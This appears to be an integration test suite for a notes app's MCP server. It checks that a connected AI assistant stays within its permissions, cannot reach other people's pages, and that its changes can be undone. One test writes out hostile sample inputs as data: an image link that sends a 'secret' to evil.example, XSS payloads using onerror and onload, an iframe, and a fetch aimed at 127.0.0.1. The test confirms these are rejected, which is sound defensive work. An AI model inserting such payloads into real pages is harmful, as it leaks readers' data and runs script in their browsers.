import test, { before, after } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import mongoose from 'mongoose';
import request from 'supertest';
import sharp from 'sharp';
import { MongoMemoryReplSet } from 'mongodb-memory-server';
import { createApp } from '../src/app.js';
import { allModels, User, Note, Notebook, NoteRevision, AgentBatch, Media } from '../src/models/index.js';
import * as noteTools from '../src/services/agent/noteTools.js';
import { BRAND } from '../../shared/brand.js';
import { AGENT_LIMITS, SCOPE_IDS, DEFAULT_SCOPES } from '../../shared/agent.js';

/**
 * An assistant working in the Notes tab, end to end over MCP: what it may do by default, what
 * needs a permission, that it cannot touch anyone else's pages or load things into a page, and
 * that everything it creates can be taken back.
 */

const enabled = process.env.RUN_INTEGRATION === '1';
const password = 'Integration-only-password-2026';
let mongo, app, owner, stranger, viewer, ownerId;
const REDIRECT = 'https://claude.ai/api/mcp/auth_callback';

before(async () => {
  if (!enabled) return;
  process.env.DISABLE_RATE_LIMIT = '1';
  const dbName = `${BRAND.slug}_notesagent_${crypto.randomBytes(6).toString('hex')}`;
  if (!process.env.TEST_MONGODB_URI) mongo = await MongoMemoryReplSet.create({ replSet: { count: 1, storageEngine: 'wiredTiger' } });
  await mongoose.connect(process.env.TEST_MONGODB_URI || mongo.getUri(), { dbName });
  await Promise.all(allModels.map(m => m.init()));
  app = createApp();
  [owner, stranger, viewer] = [request.agent(app), request.agent(app), request.agent(app)];
  for (const [agent, username] of [[owner, 'noteowner'], [stranger, 'notestranger'], [viewer, 'noteviewer']]) {
    const r = await agent.post('/api/auth/signup').send({ username, name: username, email: `${username}@example.test`, password, country: 'India', acceptedTerms: true });
    assert.equal(r.status, 201, JSON.stringify(r.body));
  }
  await User.updateMany({}, { $set: { account: 'premium', emailVerifiedAt: new Date() } });
  ownerId = (await User.findOne({ username: 'noteowner' })).id;
});

after(async () => {
  if (mongoose.connection.readyState) { await mongoose.connection.dropDatabase(); await mongoose.disconnect(); }
  if (mongo) await mongo.stop();
  delete process.env.DISABLE_RATE_LIMIT;
});

const integration = (name, fn) => test(name, { skip: !enabled }, fn);

let rpcId = 0;
const mcp = (token, method, params = {}) => request(app).post('/mcp').set('Authorization', `Bearer ${token}`)
  .set('Accept', 'application/json, text/event-stream').send({ jsonrpc: '2.0', id: ++rpcId, method, params });
const resultOf = res => {
  const payload = res.body?.result, text = payload?.content?.[0]?.text;
  try { return { data: JSON.parse(text), isError: !!payload?.isError }; } catch { return { data: text, isError: !!payload?.isError }; }
};
const call = async (token, name, args) => resultOf(await mcp(token, 'tools/call', { name, arguments: args }));
const rid = () => crypto.randomUUID();

async function connect(agent = owner, scopes) {
  await agent.delete('/api/agent/grants');
  const reg = await request(app).post('/oauth/register').send({ client_name: 'Claude', redirect_uris: [REDIRECT] });
  const verifier = crypto.randomBytes(48).toString('base64url');
  const query = {
    response_type: 'code', client_id: reg.body.client_id, redirect_uri: REDIRECT,
    code_challenge: crypto.createHash('sha256').update(verifier).digest('base64url'), code_challenge_method: 'S256', state: 'st4te',
    ...(scopes ? { scope: scopes.join(' ') } : {}),
  };
  const approved = await agent.post('/api/oauth/consent').send({ ...query, approve: true });
  assert.equal(approved.status, 200, JSON.stringify(approved.body));
  const code = new URL(approved.body.redirect).searchParams.get('code');
  const tok = await request(app).post('/oauth/token').send({ grant_type: 'authorization_code', code, code_verifier: verifier, redirect_uri: REDIRECT, client_id: reg.body.client_id });
  assert.equal(tok.status, 200, JSON.stringify(tok.body));
  return tok.body.access_token;
}

/** A notebook and a page the person made by hand, for the tests that need something already there. */
async function personalPage(body = 'Written by a person.') {
  const col = (await owner.post('/api/note-collections').send({ title: `C ${rid().slice(0, 6)}` })).body.collection;
  const nb = (await owner.post('/api/notebooks').send({ title: 'Mine', collection: col.id })).body.notebook;
  const page = (await owner.post(`/api/notebooks/${nb.id}/notes`).send({ title: 'Mine', body })).body.note;
  return { col, nb, page };
}

integration('by default an assistant can read and add to notes but not rewrite them; rewriting is offered only when asked for', async () => {
  const plain = await mcp(await connect(owner, DEFAULT_SCOPES), 'tools/list');
  const names = plain.body.result.tools.map(t => t.name);
  for (const n of ['list_notebooks', 'search_pages', 'get_page', 'create_notebook', 'create_page', 'append_to_page', 'add_image_to_page']) assert.ok(names.includes(n), `${n} is listed`);
  assert.ok(!names.includes('update_page'), 'no rewrite tool without the permission');
  assert.ok(!SCOPE_IDS.filter(s => DEFAULT_SCOPES.includes(s)).includes('notes:edit'));
  assert.ok(!names.some(n => /delete|remove|share|publish/.test(n)), 'nothing deletes or publishes');

  const token = await connect(owner, SCOPE_IDS);
  const res = await mcp(token, 'tools/list');
  assert.ok(res.body.result.tools.some(t => t.name === 'update_page' && t.annotations.destructiveHint));
  const refused = await call(await connect(owner, DEFAULT_SCOPES), 'update_page', { pageId: '507f1f77bcf86cd799439011', expectedVersion: 0, body: 'x' });
  assert.equal(refused.isError, true);
});

integration('a notebook and a page are created, and a retry does not make them twice', async () => {
  const token = await connect();
  const requestId = rid();
  const first = await call(token, 'create_notebook', { title: 'Biology', requestId });
  assert.equal(first.isError, false, JSON.stringify(first.data));
  const again = await call(token, 'create_notebook', { title: 'Biology', requestId });
  assert.equal(again.data.replayed, true);
  assert.equal(again.data.notebookId, first.data.notebookId);
  assert.equal(await Notebook.countDocuments({ title: 'Biology', owner: ownerId }), 1, 'a retry added nothing');
  const reused = await call(token, 'create_notebook', { title: 'Chemistry', requestId });
  assert.equal(reused.isError, true);
  assert.match(reused.data, /already used for a different request/);

  const page = await call(token, 'create_page', { notebookId: first.data.notebookId, title: 'Cells', body: '## Cells\n\nThe nucleus holds DNA. $E=mc^2$', tags: ['Bio', 'cells'], requestId: rid() });
  assert.equal(page.isError, false, JSON.stringify(page.data));
  const row = await Note.findById(page.data.pageId);
  assert.equal(row.title, 'Cells');
  assert.deepEqual([...row.tags], ['bio', 'cells'], 'tags are normalised like a person’s');
  assert.equal(String(row.createdBy), ownerId, 'it is the person’s page');
  const read = await call(token, 'get_page', { pageId: page.data.pageId });
  assert.equal(read.data.body, row.body);
  assert.equal(read.data.canAppend, true);
  assert.equal(read.data.canRewrite, false);
  const found = await call(token, 'search_pages', { query: 'nucleus' });
  assert.equal(found.data.matches[0].id, page.data.pageId);
  const listed = await call(token, 'list_notebooks', {});
  assert.ok(listed.data.notebooks.some(n => n.id === first.data.notebookId && n.pages === 1));
  assert.ok(listed.data.collections.length >= 1, 'collections to create into are offered');
});

integration('text that would load something into the reader’s browser is refused', async () => {
  const token = await connect();
  const { nb } = await personalPage();
  for (const body of ['![x](https://evil.example/p.png?d=secret)', 'Hi <img src=x onerror=alert(1)>', '![x][ref]\n\n[ref]: https://evil.example/p.png', '<iframe src="https://evil.example"></iframe>', '<svg onload=alert(1)>']) {
    const r = await call(token, 'create_page', { notebookId: nb.id, title: 'T', body, requestId: rid() });
    assert.equal(r.isError, true, body);
    assert.match(r.data, /not allowed|cannot be linked/);
  }
  const { page } = await personalPage();
  const append = await call(token, 'append_to_page', { pageId: page.id, text: '![t](https://evil.example/t.gif)', requestId: rid() });
  assert.equal(append.isError, true);
  assert.equal((await Note.findById(page.id)).body, 'Written by a person.', 'nothing was added');
  const ok = await call(token, 'append_to_page', { pageId: page.id, text: 'A [plain link](https://example.org) is fine, and so is `code`.', requestId: rid() });
  assert.equal(ok.isError, false, JSON.stringify(ok.data));
});

integration('adding to a page keeps what it said, retries once, and respects the page limit', async () => {
  const token = await connect();
  const { page } = await personalPage('First paragraph.');
  const requestId = rid();
  const a = await call(token, 'append_to_page', { pageId: page.id, text: 'Second paragraph.', requestId });
  assert.equal(a.isError, false, JSON.stringify(a.data));
  assert.equal(a.data.version, 1);
  const again = await call(token, 'append_to_page', { pageId: page.id, text: 'Second paragraph.', requestId });
  assert.equal(again.data.replayed, true);
  const row = await Note.findById(page.id);
  assert.equal(row.body, 'First paragraph.\n\nSecond paragraph.', 'added once, at the end');
  assert.equal(row.version, 1);

  const history = await owner.get(`/api/notes/${page.id}/revisions`);
  assert.equal(history.status, 200);
  assert.equal(history.body.revisions.length, 1);
  assert.equal(history.body.revisions[0].via, 'assistant');
  const old = await owner.get(`/api/notes/${page.id}/revisions/${history.body.revisions[0].id}`);
  assert.equal(old.body.revision.body, 'First paragraph.', 'what it said before is recoverable');

  const huge = await call(token, 'append_to_page', { pageId: page.id, text: 'x'.repeat(100_000), requestId: rid() });
  assert.equal(huge.isError, true);
  assert.match(huge.data, /longer than/);
  // A save that happened in between is not a conflict for an append, which cannot overwrite it.
  await owner.patch(`/api/notes/${page.id}`).send({ version: 1, body: `${row.body}\n\nPerson added this.` });
  const after = await call(token, 'append_to_page', { pageId: page.id, text: 'Third.', requestId: rid() });
  assert.equal(after.isError, false);
  assert.equal((await Note.findById(page.id)).body, 'First paragraph.\n\nSecond paragraph.\n\nPerson added this.\n\nThird.');
});

integration('rewriting a page needs the permission, the right version, and keeps the pictures', async () => {
  const withEdit = await connect(owner, SCOPE_IDS);
  const { nb, page } = await personalPage('Original text.');
  const png = await sharp({ create: { width: 20, height: 20, channels: 3, background: '#2563eb' } }).png().toBuffer();
  const up = await owner.post(`/api/notebooks/${nb.id}/images`).attach('image', png, 'a.png');
  assert.equal(up.status, 201, JSON.stringify(up.body));
  const line = `![Diagram](media:${up.body.id}?w=50)`;
  const saved = await owner.patch(`/api/notes/${page.id}`).send({ version: 0, body: `Original text.\n\n${line}` });
  assert.equal(saved.status, 200, JSON.stringify(saved.body));

  const stale = await call(withEdit, 'update_page', { pageId: page.id, expectedVersion: 0, body: `New.\n\n${line}` });
  assert.equal(stale.isError, true);
  assert.equal(stale.data.code, 'VERSION_CONFLICT');
  assert.equal(stale.data.current.version, 1, 'the current page is returned to show the person');

  const dropped = await call(withEdit, 'update_page', { pageId: page.id, expectedVersion: 1, body: 'Rewritten without the picture.' });
  assert.equal(dropped.isError, true);
  assert.equal(dropped.data.code, 'REMOVES_PICTURES');
  assert.ok(dropped.data.keep[0].includes(up.body.id));
  assert.equal((await Note.findById(page.id)).version, 1, 'nothing was written');

  const preview = await call(withEdit, 'update_page', { pageId: page.id, expectedVersion: 1, body: `Rewritten.\n\n${line}`, dryRun: true });
  assert.equal(preview.data.dryRun, true);
  assert.equal((await Note.findById(page.id)).version, 1, 'a dry run writes nothing');

  const done = await call(withEdit, 'update_page', { pageId: page.id, expectedVersion: 1, title: 'Better title', body: `Rewritten.\n\n${line}` });
  assert.equal(done.isError, false, JSON.stringify(done.data));
  assert.deepEqual(done.data.changed, ['title', 'body']);
  const row = await Note.findById(page.id);
  assert.equal(row.title, 'Better title');
  assert.equal(row.version, 2);
  const revs = await NoteRevision.find({ note: page.id });
  assert.ok(revs.some(r => r.body.startsWith('Original text.') && r.via === 'assistant'), 'the old text is in the history');
  const batches = await owner.get('/api/agent/batches');
  assert.ok(!batches.body.batches.some(b => b.collection === 'Mine' && b.pageCount === 0), 'edits are restored from history, not listed to undo');
  const noUndo = await AgentBatch.findOne({ kind: 'noteedit' });
  const refusedUndo = await owner.post(`/api/agent/batches/${noUndo.id}/undo`);
  assert.equal(refusedUndo.status, 409);
});

integration('an assistant cannot reach another person’s notes, and a viewer’s assistant cannot write', async () => {
  const { nb, page } = await personalPage('Private to the owner.');
  const theirs = await connect(stranger);
  const read = await call(theirs, 'get_page', { pageId: page.id });
  const missing = await call(theirs, 'get_page', { pageId: '507f1f77bcf86cd799439011' });
  assert.equal(read.isError, true);
  assert.equal(read.data, missing.data, 'not yours and not there look identical');
  assert.equal((await call(theirs, 'search_pages', { query: 'Private' })).data.matches.length, 0);
  assert.equal((await call(theirs, 'search_pages', { query: 'Private', notebookId: nb.id })).isError, true);
  assert.equal((await call(theirs, 'append_to_page', { pageId: page.id, text: 'hijack', requestId: rid() })).isError, true);
  assert.equal((await call(theirs, 'create_page', { notebookId: nb.id, title: 'x', requestId: rid() })).isError, true);
  assert.equal((await Note.findById(page.id)).body, 'Private to the owner.');

  const share = await owner.post(`/api/notebooks/${nb.id}/members`).send({ username: 'noteviewer', role: 'viewer' });
  assert.equal(share.status, 200, JSON.stringify(share.body));
  const readOnly = await connect(viewer);
  const seen = await call(readOnly, 'get_page', { pageId: page.id });
  assert.equal(seen.isError, false, 'a viewer can read');
  assert.equal(seen.data.canAppend, false);
  assert.equal((await call(readOnly, 'append_to_page', { pageId: page.id, text: 'no', requestId: rid() })).isError, true);
  assert.equal((await call(readOnly, 'create_page', { notebookId: nb.id, title: 'x', requestId: rid() })).isError, true);
  const exportViewer = await viewer.get(`/api/notebooks/${nb.id}/export`);
  assert.equal(exportViewer.status, 200, 'a viewer can download the notebook');
  assert.equal(exportViewer.body.pages.length, 1);
  assert.equal((await stranger.get(`/api/notebooks/${nb.id}/export`)).status, 404);

  // An archived notebook is read-only for an assistant as it is for a person.
  await owner.patch(`/api/notebooks/${nb.id}/archive`).send({ archived: true });
  assert.equal((await call(await connect(), 'append_to_page', { pageId: page.id, text: 'late', requestId: rid() })).isError, true);
});

integration('what an assistant created can be undone, and a notebook with a person’s pages in it stays', async () => {
  const token = await connect();
  const nb = await call(token, 'create_notebook', { title: 'Throwaway', requestId: rid() });
  const p = await call(token, 'create_page', { notebookId: nb.data.notebookId, title: 'Doomed', body: 'x', requestId: rid() });
  const list = await owner.get('/api/agent/batches');
  const pageBatch = list.body.batches.find(b => b.kind === 'notes' && b.pageCount === 1 && b.collection === 'Throwaway');
  const bookBatch = list.body.batches.find(b => b.kind === 'notes' && b.createdNotebook && b.collection === 'Throwaway');
  assert.ok(pageBatch && bookBatch, 'both are listed');

  // The person writes a page of their own before undoing anything.
  const mine = await owner.post(`/api/notebooks/${nb.data.notebookId}/notes`).send({ title: 'Mine', body: 'keep' });
  assert.equal(mine.status, 201);
  const undonePage = await owner.post(`/api/agent/batches/${pageBatch.id}/undo`);
  assert.equal(undonePage.body.removed, 1);
  assert.equal(await Note.findById(p.data.pageId), null);
  const undoneBook = await owner.post(`/api/agent/batches/${bookBatch.id}/undo`);
  assert.equal(undoneBook.body.notebookRemoved, false, 'it holds a page the person wrote');
  assert.ok(await Notebook.findById(nb.data.notebookId));
  assert.equal((await owner.post(`/api/agent/batches/${pageBatch.id}/undo`)).status, 409, 'twice is a conflict');

  await owner.delete(`/api/notes/${mine.body.note.id}`);
  const empty = await call(token, 'create_notebook', { title: 'Empty one', requestId: rid() });
  const emptyBatch = (await owner.get('/api/agent/batches')).body.batches.find(b => b.notebookId === empty.data.notebookId);
  const gone = await owner.post(`/api/agent/batches/${emptyBatch.id}/undo`);
  assert.equal(gone.body.notebookRemoved, true);
  assert.equal(await Notebook.findById(empty.data.notebookId), null);
});

integration('a picture goes on a page only with the images permission, is stored with the notebook, and counts against the allowance', async () => {
  const { nb, page } = await personalPage('With a picture below.');
  const without = await connect(owner, ['notes:read', 'notes:write']);
  const refused = await call(without, 'add_image_to_page', { pageId: page.id, imageUrl: 'https://example.org/a.png', requestId: rid() });
  assert.equal(refused.isError, true);
  assert.match(refused.data, /permission/);

  const token = await connect(owner, ['notes:read', 'notes:write', 'images:write']);
  const blocked = await call(token, 'add_image_to_page', { pageId: page.id, imageUrl: 'https://127.0.0.1/a.png', requestId: rid() });
  assert.equal(blocked.isError, true, 'a private address is never fetched');
  assert.equal((await Note.findById(page.id)).version, 0);

  const png = await sharp({ create: { width: 30, height: 20, channels: 3, background: '#10b981' } }).png().toBuffer();
  const original = noteTools.deps.fetchImage;
  let fetched = 0;
  noteTools.deps.fetchImage = async () => { fetched += 1; return { body: png }; };
  try {
    const requestId = rid();
    const added = await call(token, 'add_image_to_page', { pageId: page.id, imageUrl: 'https://example.org/a.png', caption: 'Leaf [1]\nnew line', width: 53, requestId });
    assert.equal(added.isError, false, JSON.stringify(added.data));
    const row = await Note.findById(page.id);
    const m = row.body.match(/!\[(.*)\]\(media:([0-9a-f]{24})\?w=55\)$/);
    assert.ok(m, `embed line with a clamped width: ${row.body}`);
    assert.doesNotMatch(m[1], /[\]\n]/, 'a caption cannot break out of the line');
    const media = await Media.findById(m[2]);
    assert.equal(String(media.notebook), nb.id, 'stored with the notebook, not a flashcard collection');
    assert.equal(media.folder ?? null, null);

    const replay = await call(token, 'add_image_to_page', { pageId: page.id, imageUrl: 'https://example.org/a.png', caption: 'Leaf [1]\nnew line', width: 53, requestId });
    assert.equal(replay.data.replayed, true);
    assert.equal(fetched, 1, 'a retry does not fetch again');
    assert.equal(await Media.countDocuments({ notebook: nb.id }), 1);

    const row2 = await AgentBatch.findOne({ requestId });
    assert.equal(row2.imageCount, 1, 'it uses the daily image allowance');
    const same = await call(token, 'add_image_to_page', { pageId: page.id, imageUrl: 'https://example.org/other-address.png', requestId: rid() });
    assert.equal(same.isError, false);
    assert.equal(await Media.countDocuments({ notebook: nb.id }), 1, 'the same picture from another address is stored once');
  } finally { noteTools.deps.fetchImage = original; }
});

integration('there is a ceiling on how many notebooks an assistant makes in a day', async () => {
  const token = await connect();
  await AgentBatch.deleteMany({ user: ownerId });
  for (let i = 0; i < AGENT_LIMITS.notebooksPerDay; i++) {
    const r = await call(token, 'create_notebook', { title: `Bulk ${i}`, requestId: rid() });
    assert.equal(r.isError, false, JSON.stringify(r.data));
  }
  const over = await call(token, 'create_notebook', { title: 'One too many', requestId: rid() });
  assert.equal(over.isError, true);
  assert.match(over.data, /new notebooks/);
});

integration('page history is for editors, keeps a bounded number, and goes when the page does', async () => {
  const { nb, page } = await personalPage('v0');
  const token = await connect();
  for (let i = 0; i < 24; i++) await call(token, 'append_to_page', { pageId: page.id, text: `line ${i}`, requestId: rid() });
  const rows = await NoteRevision.countDocuments({ note: page.id });
  assert.equal(rows, 20, 'only the last twenty are kept');
  const share = await owner.post(`/api/notebooks/${nb.id}/members`).send({ username: 'noteviewer', role: 'viewer' });
  assert.equal(share.status, 200);
  assert.equal((await viewer.get(`/api/notes/${page.id}/revisions`)).status, 403, 'a viewer cannot read old versions');
  assert.equal((await stranger.get(`/api/notes/${page.id}/revisions`)).status, 404);
  await owner.delete(`/api/notes/${page.id}`);
  assert.equal(await NoteRevision.countDocuments({ note: page.id }), 0, 'history is deleted with the page');
});
